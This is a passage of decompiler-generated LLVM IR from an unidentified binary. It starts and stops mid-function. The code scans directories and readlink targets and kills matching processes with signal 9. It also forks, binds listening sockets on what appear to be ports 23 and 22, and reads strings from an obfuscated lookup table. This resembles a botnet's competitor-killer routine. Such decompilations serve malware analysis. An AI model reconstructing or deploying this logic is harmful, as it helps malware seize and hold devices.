dec_label_pc_1017c.loopexit:                      ; preds = %dec_label_pc_10194, %dec_label_pc_101a8, %dec_label_pc_10210
  %v0_1017c = load i32, i32* @r8, align 4
  %v1_10180 = call i32 @_readdir(i32 %v0_1017c)
  %v2_10184 = icmp eq i32 %v1_10180, 0
  br i1 %v2_10184, label %dec_label_pc_10390, label %dec_label_pc_1018c.preheader

dec_label_pc_1018c.preheader:                     ; preds = %dec_label_pc_1018c.preheader.lr.ph, %dec_label_pc_1017c.loopexit
  %v0_1019492 = phi i32 [ %v1_1018044, %dec_label_pc_1018c.preheader.lr.ph ], [ %v1_10180, %dec_label_pc_1017c.loopexit ]
  br label %dec_label_pc_1018c

dec_label_pc_1018c:                               ; preds = %dec_label_pc_1018c.preheader, %dec_label_pc_10378
  %v0_101a0 = phi i32 [ %v0_1019492, %dec_label_pc_1018c.preheader ], [ %v1_10384, %dec_label_pc_10378 ]
  %v0_1018c = load i32, i32* @r5, align 4
  %v2_1018c = icmp eq i32 %v0_1018c, 0
  br i1 %v2_1018c, label %dec_label_pc_10194, label %dec_label_pc_10390

dec_label_pc_10194:                               ; preds = %dec_label_pc_1018c
  %v1_10194 = add i32 %v0_101a0, 11
  %v2_10194 = inttoptr i32 %v1_10194 to i8*
  %v3_10194 = load i8, i8* %v2_10194, align 1
  %v4_10194 = zext i8 %v3_10194 to i32
  %v1_10198 = add nsw i32 %v4_10194, -48
  store i32 %v1_10194, i32* @r7, align 4
  %tmp = icmp ugt i32 %v1_10198, 9
  br i1 %tmp, label %dec_label_pc_1017c.loopexit, label %dec_label_pc_101a8

dec_label_pc_101a8:                               ; preds = %dec_label_pc_10194
  %v3_101b0 = call i32 @function_13c04(i32 6, i32* null)
  store i32 %v2_fed4, i32* @r0, align 4
  %v3_101bc = call i32 @function_14634(i8* %v2_101bc, i32 %v3_101b0)
  %v2_101c4 = call i32 @function_1460c(i8* %v2_101bc)
  %v0_101c8 = load i32, i32* @r7, align 4
  %v0_101cc = load i32, i32* @sl, align 4
  %v2_101cc = add i32 %v0_101cc, %v2_101c4
  store i32 %v2_101cc, i32* @r0, align 4
  %v2_101d0 = inttoptr i32 %v2_101cc to i8*
  %v3_101d0 = call i32 @function_14634(i8* %v2_101d0, i32 %v0_101c8)
  %v2_101d8 = call i32 @function_1460c(i8* %v2_101bc)
  %v0_101dc = load i32, i32* @r5, align 4
  %v2_101e8 = inttoptr i32 %v0_101dc to i32*
  %v3_101e8 = call i32 @function_13c04(i32 7, i32* %v2_101e8)
  %v0_101f0 = load i32, i32* @sl, align 4
  %v2_101f0 = add i32 %v2_101d8, %v0_101f0
  store i32 %v2_101f0, i32* @r0, align 4
  %v2_101f4 = inttoptr i32 %v2_101f0 to i8*
  %v3_101f4 = call i32 @function_14634(i8* %v2_101f4, i32 %v3_101e8)
  %v3_10204 = call i32 @_readlink(i32 %v2_fed4, i32 %v2_fee8, i32 4096)
  %v7_10208 = icmp eq i32 %v3_10204, -1
  br i1 %v7_10208, label %dec_label_pc_1017c.loopexit, label %dec_label_pc_10210

dec_label_pc_10210:                               ; preds = %dec_label_pc_101a8
  %v0_10210 = load i32, i32* @r5, align 4
  %v2_10218 = inttoptr i32 %v0_10210 to i32*
  %v3_10218 = call i32 @function_13c04(i32 6, i32* %v2_10218)
  store i32 %v2_fed4, i32* @r0, align 4
  %v3_10224 = call i32 @function_14634(i8* %v2_101bc, i32 %v3_10218)
  %v2_1022c = call i32 @function_1460c(i8* %v2_101bc)
  %v0_10230 = load i32, i32* @r7, align 4
  %v0_10234 = load i32, i32* @sl, align 4
  %v2_10234 = add i32 %v0_10234, %v2_1022c
  store i32 %v2_10234, i32* @r0, align 4
  %v2_10238 = inttoptr i32 %v2_10234 to i8*
  %v3_10238 = call i32 @function_14634(i8* %v2_10238, i32 %v0_10230)
  %v2_10240 = call i32 @function_1460c(i8* %v2_101bc)
  %v0_10244 = load i32, i32* @r5, align 4
  %v2_10250 = inttoptr i32 %v0_10244 to i32*
  %v3_10250 = call i32 @function_13c04(i32 9, i32* %v2_10250)
  %v0_10258 = load i32, i32* @sl, align 4
  %v2_10258 = add i32 %v2_10240, %v0_10258
  store i32 %v2_10258, i32* @r0, align 4
  %v2_1025c = inttoptr i32 %v2_10258 to i8*
  %v3_1025c = call i32 @function_14634(i8* %v2_1025c, i32 %v3_10250)
  %v1_10264 = call i32 @_opendir(i32 %v2_fed4)
  store i32 %v1_10264, i32* %sb.global-to-local, align 4
  %v2_10268 = icmp eq i32 %v1_10264, 0
  br i1 %v2_10268, label %dec_label_pc_1017c.loopexit, label %dec_label_pc_10270.preheader

dec_label_pc_10270.preheader:                     ; preds = %dec_label_pc_10210
  %v1_1027440 = call i32 @_readdir(i32 %v1_10264)
  store i32 %v1_1027440, i32* @r6, align 4
  %v2_1027842 = icmp eq i32 %v1_1027440, 0
  br i1 %v2_1027842, label %dec_label_pc_10378, label %dec_label_pc_10288thread-pre-split

dec_label_pc_10270.loopexit:                      ; preds = %dec_label_pc_10290, %dec_label_pc_10328
  %v0_10270 = load i32, i32* %sb.global-to-local, align 4
  %v1_10274 = call i32 @_readdir(i32 %v0_10270)
  store i32 %v1_10274, i32* @r6, align 4
  %v2_10278 = icmp eq i32 %v1_10274, 0
  br i1 %v2_10278, label %dec_label_pc_10378, label %dec_label_pc_10288thread-pre-split

dec_label_pc_10288thread-pre-split:               ; preds = %dec_label_pc_10270.preheader, %dec_label_pc_10270.loopexit
  %v0_10288.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_10288

dec_label_pc_10288:                               ; preds = %dec_label_pc_10288thread-pre-split, %dec_label_pc_10350
  %v0_10288 = phi i32 [ %v0_10288.pr, %dec_label_pc_10288thread-pre-split ], [ 1, %dec_label_pc_10350 ]
  %v2_10288 = icmp eq i32 %v0_10288, 0
  br i1 %v2_10288, label %dec_label_pc_10290, label %dec_label_pc_10378

dec_label_pc_10290:                               ; preds = %dec_label_pc_10288
  %v2_10290 = call i32 @function_146ac(i32 %v2_fee8, i32 4096)
  %v0_10294 = load i32, i32* @r5, align 4
  %v2_1029c = inttoptr i32 %v0_10294 to i32*
  %v3_1029c = call i32 @function_13c04(i32 6, i32* %v2_1029c)
  store i32 %v2_fed4, i32* @r0, align 4
  %v3_102a8 = call i32 @function_14634(i8* %v2_101bc, i32 %v3_1029c)
  %v2_102b0 = call i32 @function_1460c(i8* %v2_101bc)
  %v0_102b4 = load i32, i32* @r7, align 4
  %v0_102b8 = load i32, i32* @sl, align 4
  %v2_102b8 = add i32 %v0_102b8, %v2_102b0
  store i32 %v2_102b8, i32* @r0, align 4
  %v2_102bc = inttoptr i32 %v2_102b8 to i8*
  %v3_102bc = call i32 @function_14634(i8* %v2_102bc, i32 %v0_102b4)
  %v2_102c4 = call i32 @function_1460c(i8* %v2_101bc)
  %v0_102c8 = load i32, i32* @r5, align 4
  store i32 %v2_102c4, i32* @r4, align 4
  %v2_102d4 = inttoptr i32 %v0_102c8 to i32*
  %v3_102d4 = call i32 @function_13c04(i32 9, i32* %v2_102d4)
  %v0_102dc = load i32, i32* @sl, align 4
  %v1_102dc = load i32, i32* @r4, align 4
  %v2_102dc = add i32 %v1_102dc, %v0_102dc
  store i32 %v2_102dc, i32* @r0, align 4
  %v2_102e0 = inttoptr i32 %v2_102dc to i8*
  %v3_102e0 = call i32 @function_14634(i8* %v2_102e0, i32 %v3_102d4)
  %v2_102e8 = call i32 @function_1460c(i8* %v2_101bc)
  %v0_102f0 = load i32, i32* @sl, align 4
  %v2_102f0 = add i32 %v0_102f0, %v2_102e8
  store i32 %v2_102f0, i32* @r0, align 4
  %v2_102f4 = inttoptr i32 %v2_102f0 to i8*
  %v3_102f4 = call i32 @function_14634(i8* %v2_102f4, i32 ptrtoint (i32* @global_var_14f70.78 to i32))
  %v2_102fc = call i32 @function_1460c(i8* %v2_101bc)
  %v0_10300 = load i32, i32* @r6, align 4
  %v1_10300 = add i32 %v0_10300, 11
  %v0_10304 = load i32, i32* @sl, align 4
  %v2_10304 = add i32 %v0_10304, %v2_102fc
  store i32 %v2_10304, i32* @r0, align 4
  %v2_10308 = inttoptr i32 %v2_10304 to i8*
  %v3_10308 = call i32 @function_14634(i8* %v2_10308, i32 %v1_10300)
  %v3_10318 = call i32 @_readlink(i32 %v2_fed4, i32 %v2_fee8, i32 4096)
  %v7_1031c = icmp eq i32 %v3_10318, -1
  br i1 %v7_1031c, label %dec_label_pc_10270.loopexit, label %dec_label_pc_10328

dec_label_pc_10328:                               ; preds = %dec_label_pc_10290
  %v2_10328 = call i32 @function_1460c(i8* %v1_10328)
  store i32 %v2_10328, i32* @r1, align 4
  %v4_1033c = call i32 @function_14960(i8* %v1_10328, i32 %v2_10328, i32 %v2_1014c.pre-phi)
  %v7_10340 = icmp eq i32 %v4_1033c, -1
  br i1 %v7_10340, label %dec_label_pc_10270.loopexit, label %dec_label_pc_10350

dec_label_pc_10350:                               ; preds = %dec_label_pc_10328
  %v0_10348 = load i32, i32* @r7, align 4
  %v2_10350 = inttoptr i32 %v0_10348 to i8*
  %v3_10350 = call i32 @function_14738(i8* %v2_10350, i32 10)
  %v2_10358 = call i32 @_kill(i32 %v3_10350, i32 9)
  %v0_1035c = load i32, i32* %sb.global-to-local, align 4
  %v1_10360 = call i32 @_readdir(i32 %v0_1035c)
  store i32 %v1_10360, i32* @r6, align 4
  %v2_10364 = icmp eq i32 %v1_10360, 0
  store i32 1, i32* @r5, align 4
  br i1 %v2_10364, label %dec_label_pc_10378, label %dec_label_pc_10288

dec_label_pc_10378:                               ; preds = %dec_label_pc_10270.loopexit, %dec_label_pc_10350, %dec_label_pc_10288, %dec_label_pc_10270.preheader
  %v0_10378 = load i32, i32* %sb.global-to-local, align 4
  %v1_1037c = call i32 @_closedir(i32 %v0_10378)
  %v0_10380 = load i32, i32* @r8, align 4
  %v1_10384 = call i32 @_readdir(i32 %v0_10380)
  %v2_10388 = icmp eq i32 %v1_10384, 0
  br i1 %v2_10388, label %dec_label_pc_10390, label %dec_label_pc_1018c

dec_label_pc_10390:                               ; preds = %dec_label_pc_1017c.loopexit, %dec_label_pc_10378, %dec_label_pc_1018c, %dec_label_pc_1017c.preheader
  %v0_10390 = load i32, i32* @r8, align 4
  %v1_10394 = call i32 @_closedir(i32 %v0_10390)
  %v0_10398 = load i32, i32* @r5, align 4
  %v1_10398 = urem i32 %v0_10398, 256
  br label %dec_label_pc_1039c

dec_label_pc_1039c:                               ; preds = %dec_label_pc_1015c, %dec_label_pc_10390
  %storemerge = phi i32 [ %v1_10398, %dec_label_pc_10390 ], [ 0, %dec_label_pc_1015c ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_103a0 = call i32 @_sleep(i32 1)
  br label %dec_label_pc_103a4

dec_label_pc_103a4:                               ; preds = %dec_label_pc_10140, %dec_label_pc_1039c
  %v1_103a8 = call i32 @function_13c30(i32 6)
  %v1_103b0 = call i32 @function_13c30(i32 7)
  %v1_103b8 = call i32 @function_13c30(i32 9)
  br label %dec_label_pc_103bc

dec_label_pc_103bc:                               ; preds = %dec_label_pc_ff70, %dec_label_pc_103a4
  %v0_103bc = load i32, i32* @r4, align 4
  %v2_103c8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_103c8, i32* @r4, align 4
  store i32 %v6_fec0, i32* @r5, align 4
  store i32 %v9_fec0, i32* @r6, align 4
  store i32 %v12_fec0, i32* @r7, align 4
  store i32 %v15_fec0, i32* @r8, align 4
  store i32 %v21_fec0, i32* @sl, align 4
  ret i32 %v0_103bc

dec_label_pc_103cc:                               ; preds = %dec_label_pc_100b0
  %v1_103cc = add i32 %v0_103cc, 1
  %v7_103d0 = icmp eq i32 %v0_103cc, 0
  br i1 %v7_103d0, label %dec_label_pc_103d8, label %dec_label_pc_100b8

dec_label_pc_103d8:                               ; preds = %dec_label_pc_103cc
  %v1_103d8 = add i32 %v0_100c0, 3
  %v2_103d8 = inttoptr i32 %v1_103d8 to i8*
  %v3_103d8 = load i8, i8* %v2_103d8, align 1
  %v7_103dc = icmp eq i8 %v3_103d8, 65
  br i1 %v7_103dc, label %dec_label_pc_103ec, label %.thread33

.thread33:                                        ; preds = %dec_label_pc_103d8
  br label %dec_label_pc_10088.backedge

dec_label_pc_103ec:                               ; preds = %dec_label_pc_103d8
  store i32 %v1_103cc, i32* @r4, align 4
  br label %dec_label_pc_10088.backedge

dec_label_pc_10088.backedge:                      ; preds = %.thread33, %dec_label_pc_103ec, %dec_label_pc_100bc
  %v0_100c883 = phi i32 [ %v1_103cc, %dec_label_pc_103ec ], [ %v0_100c884, %dec_label_pc_100bc ], [ %v0_100c884, %.thread33 ]
  %v0_103cc72 = phi i32 [ %v1_103cc, %dec_label_pc_103ec ], [ %v0_100bc, %dec_label_pc_100bc ], [ %v1_103cc, %.thread33 ]
  %v0_100b0.pr69 = phi i32 [ 0, %dec_label_pc_103ec ], [ %v0_100b0.pr70, %dec_label_pc_100bc ], [ 0, %.thread33 ]
  %v0_10088 = add i32 %v0_100c0, 1
  %v1_10088 = add i32 %v0_100c0, 3
  %v2_10088 = inttoptr i32 %v1_10088 to i8*
  %v3_10088 = load i8, i8* %v2_10088, align 1
  %v2_1008c = icmp eq i8 %v3_10088, 0
  %v1_10090 = add i32 %v0_1009080, 1
  br i1 %v2_1008c, label %dec_label_pc_100c8, label %dec_label_pc_10098

dec_label_pc_103fc:                               ; preds = %dec_label_pc_fec0
  store i8 48, i8* %stack_var_-68, align 1
  br label %dec_label_pc_ff70

; uselistorder directives
  uselistorder i32 %v1_10090, { 1, 0 }
  uselistorder i8 %v3_10088, { 1, 0 }
  uselistorder i32 %v0_100c883, { 1, 0 }
  uselistorder i32 %v1_103cc, { 4, 3, 0, 2, 1 }
  uselistorder i32 %v1_10384, { 1, 0 }
  uselistorder i32 %v1_100f4, { 1, 0 }
  uselistorder i32 %v0_1010028, { 1, 0 }
  uselistorder i32 %v1_10118, { 0, 3, 1, 2 }
  uselistorder i32 %v0_100bc, { 1, 0 }
  uselistorder i32 %v0_1009080, { 1, 0 }
  uselistorder i32 %v0_103cc, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_100c884, { 1, 2, 0 }
  uselistorder i32 %v1_1009054, { 1, 0 }
  uselistorder i32 %v2_10074, { 1, 0 }
  uselistorder i32 %v1_10070, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v0_1002c13, { 1, 0, 2 }
  uselistorder i32 %v0_1001c, { 1, 0 }
  uselistorder i32 %v1_fffc, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v3_ff90, { 1, 2, 0 }
  uselistorder i32 %v2_fee8, { 2, 0, 3, 1 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i8* %stack_var_-581, { 1, 3, 0, 2 }
  uselistorder i8* %stack_var_-68, { 2, 0, 1 }
  uselistorder i32* %stack_var_-52, { 0, 1, 2, 4, 3 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 (i8*, i32)* @function_14738, { 1, 0, 2, 3, 4 }
  uselistorder i32 (i8*, i32, i32)* @function_14864, { 1, 0 }
  uselistorder i32 512, { 4, 0, 1, 7, 5, 6, 8, 2, 9, 3, 10 }
  uselistorder i32 (i32, i32, i32)* @_memset, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10088.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_103bc, { 1, 0 }
  uselistorder label %dec_label_pc_103a4, { 1, 0 }
  uselistorder label %dec_label_pc_1039c, { 1, 0 }
  uselistorder label %dec_label_pc_10390, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10378, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10288, { 1, 0 }
  uselistorder label %dec_label_pc_10288thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_10270.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_1018c, { 1, 0 }
  uselistorder label %dec_label_pc_1018c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1017c.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10114, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10098, { 1, 0 }
  uselistorder label %dec_label_pc_1003c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ffa0.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_fff0, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_ffb8, { 1, 0 }
  uselistorder label %dec_label_pc_ff70, { 1, 0 }
}

define i32 @function_1042c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1042c:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-4312 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-8408 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-8428 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1042c = load i32, i32* @r4, align 4
  store i32 %v3_1042c, i32* %stack_var_-36, align 4
  %v6_1042c = load i32, i32* @r5, align 4
  %v9_1042c = load i32, i32* @r6, align 4
  %v12_1042c = load i32, i32* @r7, align 4
  %v15_1042c = load i32, i32* @r8, align 4
  %v1_1043c = call i32 @_time(i32 0)
  store i32 %v1_1043c, i32* @r7, align 4
  %v0_10444 = call i32 @_fork()
  %v7_10448 = icmp eq i32 %v0_10444, -1
  %. = zext i1 %v7_10448 to i32
  %tmp211 = icmp slt i32 %v0_10444, 1
  %storemerge173 = select i1 %tmp211, i32 %., i32 1
  store i32 %storemerge173, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1d9b4.155 to i32), i32* %r3.global-to-local, align 4
  %v2_10464 = icmp eq i32 %storemerge173, 0
  store i32 %v0_10444, i32* @global_var_1d9b4.155, align 4
  br i1 %v2_10464, label %dec_label_pc_1047c, label %dec_label_pc_10470

dec_label_pc_10470:                               ; preds = %dec_label_pc_10648, %dec_label_pc_10530, %dec_label_pc_1042c
  %v29_10478 = phi i32 [ %v2_105d4, %dec_label_pc_10530 ], [ %v0_10444, %dec_label_pc_1042c ], [ 0, %dec_label_pc_10648 ]
  %v2_10478 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_10478, i32* @r4, align 4
  store i32 %v6_1042c, i32* @r5, align 4
  store i32 %v9_1042c, i32* @r6, align 4
  store i32 %v12_1042c, i32* @r7, align 4
  store i32 %v15_1042c, i32* @r8, align 4
  ret i32 %v29_10478

dec_label_pc_1047c:                               ; preds = %dec_label_pc_1042c
  %v2_1047c = ptrtoint i32* %stack_var_-236 to i32
  store i32 %v2_1047c, i32* %r1.global-to-local, align 4
  store i32 2, i32* @r6, align 4
  store i32 2, i32* %stack_var_-72, align 4
  %v1_10494 = call i32 @function_fec0(i32 5888)
  store i32 23, i32* %r3.global-to-local, align 4
  %v0_104a0 = load i32, i32* @r6, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_104a8 = load i32, i32* @r5, align 4
  store i32 %v0_104a8, i32* %r2.global-to-local, align 4
  %v3_104b4 = call i32 @_socket(i32 %v0_104a0, i32 1, i32 %v0_104a8)
  %v7_104b8 = icmp eq i32 %v3_104b4, -1
  store i32 %v3_104b4, i32* @r4, align 4
  br i1 %v7_104b8, label %dec_label_pc_104e0, label %dec_label_pc_104c4

dec_label_pc_104c4:                               ; preds = %dec_label_pc_1047c
  %v2_104c8 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_104c8, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_104d0 = call i32 @_bind(i32 %v3_104b4, i32 %v2_104c8, i32 16)
  %v0_104d4 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_104dc = call i32 @_listen(i32 %v0_104d4, i32 1)
  br label %dec_label_pc_104e0

dec_label_pc_104e0:                               ; preds = %dec_label_pc_1047c, %dec_label_pc_104c4
  %v1_104e4 = call i32 @function_fec0(i32 5632)
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_104f0 = load i32, i32* @r6, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_104f8 = load i32, i32* @r5, align 4
  store i32 %v0_104f8, i32* %r2.global-to-local, align 4
  %v3_10504 = call i32 @_socket(i32 %v0_104f0, i32 1, i32 %v0_104f8)
  %v7_10508 = icmp eq i32 %v3_10504, -1
  store i32 %v3_10504, i32* @r4, align 4
  br i1 %v7_10508, label %dec_label_pc_10530, label %dec_label_pc_10514

dec_label_pc_10514:                               ; preds = %dec_label_pc_104e0
  %v2_10518 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_10518, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_10520 = call i32 @_bind(i32 %v3_10504, i32 %v2_10518, i32 16)
  %v0_10524 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_1052c = call i32 @_listen(i32 %v0_10524, i32 1)
  br label %dec_label_pc_10530

dec_label_pc_10530:                               ; preds = %dec_label_pc_104e0, %dec_label_pc_10514
  %v1_10534 = call i32 @_sleep(i32 5)
  %v1_1053c = call i32 @_malloc(i32 4096)
  store i32 ptrtoint (i32* @global_var_1d95c.161 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d9b0.163 to i32), i32* %r1.global-to-local, align 4
  store i32 %v1_1053c, i32* %r2.global-to-local, align 4
  %v0_1054c = load i32, i32* @r5, align 4
  %v1_1054c = trunc i32 %v0_1054c to i8
  %v3_1054c = inttoptr i32 %v1_1053c to i8*
  store i8 %v1_1054c, i8* %v3_1054c, align 1
  %v0_10554 = load i32, i32* @r5, align 4
  %v1_10554 = load i32, i32* %r3.global-to-local, align 4
  %v2_10554 = inttoptr i32 %v1_10554 to i32*
  store i32 %v0_10554, i32* %v2_10554, align 4
  %v0_10558 = load i32, i32* %r2.global-to-local, align 4
  %v1_10558 = load i32, i32* %r1.global-to-local, align 4
  %v2_10558 = inttoptr i32 %v1_10558 to i32*
  store i32 %v0_10558, i32* %v2_10558, align 4
  %v1_1055c = call i32 @function_13ce8(i32 6)
  %v1_10564 = call i32 @function_13ce8(i32 7)
  %v0_10568 = load i32, i32* @r5, align 4
  store i32 %v0_10568, i32* %r1.global-to-local, align 4
  %v2_10570 = inttoptr i32 %v0_10568 to i32*
  %v3_10570 = call i32 @function_13c04(i32 6, i32* %v2_10570)
  %v2_10578 = ptrtoint i32* %stack_var_-8408 to i32
  store i32 %v2_10578, i32* @r8, align 4
  store i32 %v3_10570, i32* %r1.global-to-local, align 4
  store i32 %v2_10578, i32* @r0, align 4
  %v2_10584 = bitcast i32* %stack_var_-8408 to i8*
  %v3_10584 = call i32 @function_14634(i8* %v2_10584, i32 %v3_10570)
  %v0_10588 = load i32, i32* @r8, align 4
  %v2_10588 = add i32 %v0_10588, %v3_10584
  store i32 %v2_10588, i32* @r4, align 4
  %v1_1058c = call i32 @_getpid(i32 %v3_10584)
  %v2_10594 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_10594, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_1059c = trunc i32 %v1_1058c to i8
  %v4_1059c = call i32 @function_14b00(i8 %v3_1059c, i32 10, i32 %v2_10594)
  store i32 %v4_1059c, i32* %r1.global-to-local, align 4
  %v0_105a4 = load i32, i32* @r4, align 4
  store i32 %v0_105a4, i32* @r0, align 4
  %v2_105a8 = inttoptr i32 %v0_105a4 to i8*
  %v3_105a8 = call i32 @function_14634(i8* %v2_105a8, i32 %v4_1059c)
  %v0_105ac = load i32, i32* @r5, align 4
  store i32 %v0_105ac, i32* %r1.global-to-local, align 4
  %v0_105b0 = load i32, i32* @r4, align 4
  %v2_105b0 = add i32 %v0_105b0, %v3_105a8
  store i32 %v2_105b0, i32* @r4, align 4
  %v2_105b8 = inttoptr i32 %v0_105ac to i32*
  %v3_105b8 = call i32 @function_13c04(i32 7, i32* %v2_105b8)
  store i32 %v3_105b8, i32* %r1.global-to-local, align 4
  %v0_105c0 = load i32, i32* @r4, align 4
  store i32 %v0_105c0, i32* @r0, align 4
  %v2_105c4 = inttoptr i32 %v0_105c0 to i8*
  %v3_105c4 = call i32 @function_14634(i8* %v2_105c4, i32 %v3_105b8)
  %v0_105c8 = load i32, i32* @r5, align 4
  store i32 %v0_105c8, i32* %r1.global-to-local, align 4
  store i32 %v3_105c4, i32* @r6, align 4
  %v2_105d4 = call i32 @_open(i32 %v2_10578, i32 %v0_105c8)
  %v7_105d8 = icmp eq i32 %v2_105d4, -1
  br i1 %v7_105d8, label %dec_label_pc_10470, label %dec_label_pc_105e0

dec_label_pc_105e0:                               ; preds = %dec_label_pc_10530
  %v1_105e0 = call i32 @_close(i32 %v2_105d4)
  %v1_105e8 = call i32 @function_13c30(i32 6)
  %v1_105f0 = call i32 @function_13c30(i32 7)
  store i32 ptrtoint (i32* @global_var_1d9b0.163 to i32), i32* %r3.global-to-local, align 4
  %v2_105fc = load i32, i32* @global_var_1d9b0.163, align 4
  store i32 %v2_105fc, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v3_10608 = call i32 @_readlink(i32 %v2_10578, i32 %v2_105fc, i32 4095)
  %v7_1060c = icmp eq i32 %v3_10608, -1
  br i1 %v7_1060c, label %.thread5.thread, label %bb214

.thread5.thread:                                  ; preds = %dec_label_pc_105e0
  %v0_1061854 = load i32, i32* @r4, align 4
  %v1_1061855 = load i32, i32* @r6, align 4
  %v2_1061856 = add i32 %v1_1061855, %v0_1061854
  store i32 %v2_1061856, i32* %r1.global-to-local, align 4
  br label %bb215

bb214:                                            ; preds = %dec_label_pc_105e0
  %v3_10614 = load i32, i32* @global_var_1d9b0.163, align 4
  store i32 %v3_10614, i32* %r3.global-to-local, align 4
  %v0_10618 = load i32, i32* @r4, align 4
  %v1_10618 = load i32, i32* @r6, align 4
  %v2_10618 = add i32 %v1_10618, %v0_10618
  store i32 %v2_10618, i32* %r1.global-to-local, align 4
  %v1_1061c = load i32, i32* @r5, align 4
  %v2_1061c = trunc i32 %v1_1061c to i8
  %v5_1061c = add i32 %v3_10614, %v3_10608
  %v6_1061c = inttoptr i32 %v5_1061c to i8*
  store i8 %v2_1061c, i8* %v6_1061c, align 1
  %v1_10620.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb215

bb215:                                            ; preds = %.thread5.thread, %bb214
  %v1_10620 = phi i32 [ %v2_1061856, %.thread5.thread ], [ %v1_10620.pre, %bb214 ]
  %v0_10620 = load i32, i32* @r8, align 4
  %v2_10620 = sub i32 %v1_10620, %v0_10620
  store i32 %v2_10620, i32* %r1.global-to-local, align 4
  %v2_10628 = call i32 @function_146ac(i32 %v2_10578, i32 %v2_10620)
  %v2_10634 = ptrtoint i32* %stack_var_-4312 to i32
  store i32 %v2_10634, i32* %r1.global-to-local, align 4
  store i32 %v2_10634, i32* %stack_var_-8428, align 4
  %v0_1063c = load i32, i32* @r5, align 4
  %v0_10640 = load i32, i32* @r7, align 4
  store i32 %v0_10640, i32* @r4, align 4
  store i32 400, i32* @r5, align 4
  %v2_1073c = ptrtoint i32* %stack_var_-152 to i32
  %v2_10740 = bitcast i32* %stack_var_-152 to i8*
  %v2_1078c = ptrtoint i32* %stack_var_-216 to i32
  %v2_10790 = bitcast i32* %stack_var_-216 to i8*
  %v2_10900 = ptrtoint i32* %stack_var_-44 to i32
  %v2_10910 = ptrtoint i32* %stack_var_-48 to i32
  %v2_10924 = ptrtoint i32* %stack_var_-52 to i32
  %v2_10938 = ptrtoint i32* %stack_var_-40 to i32
  %v2_10950 = ptrtoint i32* %stack_var_-56 to i32
  %v2_10808 = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_10648

dec_label_pc_10648:                               ; preds = %dec_label_pc_10700, %bb215
  %stack_var_-8420.0 = phi i32 [ %v0_1063c, %bb215 ], [ %stack_var_-8420.3, %dec_label_pc_10700 ]
  %v1_1064c = call i32 @function_13ce8(i32 6)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_10658 = call i32 @function_13c04(i32 6, i32* null)
  %v1_1065c = call i32 @_opendir(i32 %v3_10658)
  store i32 %v1_1065c, i32* %sl.global-to-local, align 4
  %v2_10660 = icmp eq i32 %v1_1065c, 0
  br i1 %v2_10660, label %dec_label_pc_10470, label %dec_label_pc_10668

dec_label_pc_10668:                               ; preds = %dec_label_pc_10648
  %v1_1066c = call i32 @function_13c30(i32 6)
  %v0_10670117 = load i32, i32* %sl.global-to-local, align 4
  %v1_10674118 = call i32 @_readdir(i32 %v0_10670117)
  %v2_10678120 = icmp eq i32 %v1_10674118, 0
  br i1 %v2_10678120, label %dec_label_pc_10700, label %dec_label_pc_10680.preheader

dec_label_pc_10680.preheader:                     ; preds = %dec_label_pc_10668, %dec_label_pc_10670.backedge
  %v0_10680132 = phi i32 [ %v1_10674, %dec_label_pc_10670.backedge ], [ %v1_10674118, %dec_label_pc_10668 ]
